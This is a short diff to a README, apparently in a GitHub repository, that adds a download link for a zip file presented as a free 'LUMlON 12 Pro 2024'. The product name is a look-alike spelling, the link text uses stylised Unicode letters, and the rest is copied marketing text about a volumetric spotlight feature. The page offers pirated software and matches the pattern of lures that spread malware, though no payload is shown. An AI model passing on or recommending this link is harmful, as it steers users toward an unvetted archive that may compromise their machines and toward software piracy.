@@ -1,6 +1,6 @@
 # LUMlON 12 Pro 2024 free 
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/toocoldhub/LUMlON-12-Pro-2024-free/releases/download/lumion12/LUMlON.12.Pro.2024.free.zip)
 
 The Lumion 12 Professional package is provided with new volumetric spotlight effect, which gives users the capability to cast visible beams of light through their design. This enables you to create beautiful night time effects. This feature can be applied with stunning effect to capture elements such as swimming pool lighting, interior lighting, vehicle headlights and streetlamps.
 
